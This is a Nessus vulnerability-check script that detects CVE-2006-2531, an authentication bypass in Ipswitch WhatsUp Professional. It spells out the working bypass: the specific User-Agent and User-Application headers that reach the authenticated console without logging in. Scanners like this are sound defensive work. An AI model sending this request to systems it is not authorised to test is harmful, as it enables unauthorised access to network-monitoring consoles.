#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  This script is released under the GNU GPL v2
#

if(description)
{
 script_id(21572);
 script_version("$Revision: 1.5 $");

 script_cve_id("CVE-2006-2531");
 script_bugtraq_id(18019);

 name["english"] = "Ipswitch WhatsUp Professional Authentication bypass detection";
 script_name(english:name["english"]);

 desc["english"] = "
Synopsis :

The remote web server is affected by an authentication bypass flaw. 

Description :

The remote host is running Ipswitch WhatsUp Professional, which is
used to monitor states of applications, services and hosts. 

The version of WhatsUp Professional installed on the remote host
allows an attacker to bypass authentication with a specially-crafted
request. 

See also :

http://www.ftusecurity.com/pub/whatsup.public.pdf
http://www.securityfocus.com/archive/1/434247/30/0/threaded
http://www.ipswitch.com/support/whatsup_professional/releases/wup200601.asp

Solution : 

Upgrade to WhatsUp Professional 2006.01 or later.

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc["english"]);
 
 summary["english"] = "Checks for Ipswitch WhatsUp Professional Authentication Bypass";
 script_summary(english:summary["english"]);

 script_category(ACT_GATHER_INFO);

 script_copyright(english:"This script is Copyright (C) 2006 David Maciejak");

 family["english"] = "CGI abuses";
 family["francais"] = "CGI abuses";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 8022);
 exit(0);
}



include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:8022);
if (!get_port_state(port)) exit(0);


banner = get_http_banner(port:port);
if ("Server: Ipswitch" >!< banner) exit(0);


# Send a request and make sure we're required to login.
host = get_host_name();
req = string(
  'GET /NmConsole/Default.asp?bIsJavaScriptDisabled=false HTTP/1.1\r\n',
  'Host: ', host, '\r\n',
  'User-Agent: ', get_kb_item("global_settings/http_user_agent"), '\r\n',
  'Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*.*;q=0.5\r\n',
  'Accept-Language: en-us,en;q=0.5\r\n',
  'Accept-Encoding: gzip,deflate\r\n',
  'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n',
  'Referer: http://', host, '/\r\n',
  '\r\n'
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if(res == NULL)exit(0);


# If so...
if ("Location: /NmConsole/Login.asp" >< res)
{
  req = string(
    'GET /NmConsole/Default.asp?bIsJavaScriptDisabled=false HTTP/1.1\r\n',
    'Host: ', host, '\r\n',
    'User-Agent: Ipswitch/1.0\r\n',
    'User-Application: NmConsole\r\n',
    'Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*.*;q=0.5\r\n',
    'Accept-Language: en-us,en;q=0.5\r\n',
    'Accept-Encoding: gzip,deflate\r\n',
    'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n',
    'Referer: http://', host, '/\r\n',
    '\r\n'
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if(res == NULL)exit(0);

  # There's a problem if we're now authenticated.
  if ("<title>Group Device List for" >< res) security_warning(port);
}
